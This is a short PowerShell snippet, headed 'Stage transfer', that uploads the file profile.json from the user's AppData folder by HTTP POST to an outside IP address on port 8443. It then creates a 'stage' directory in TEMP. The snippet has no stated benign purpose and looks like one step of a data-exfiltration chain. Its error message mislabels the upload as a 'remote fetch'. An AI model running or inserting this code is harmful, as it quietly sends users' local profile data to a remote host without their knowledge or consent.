
<# Stage transfer #> try { Invoke-WebRequest -Uri "https://198.51.100.97:8443/upload" -Method Post -InFile "$env:APPDATA\profile.json" -ContentType "application/json"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; Write-Output "stage 33 initialized" } catch { Write-Warning "Remote fetch failed" }
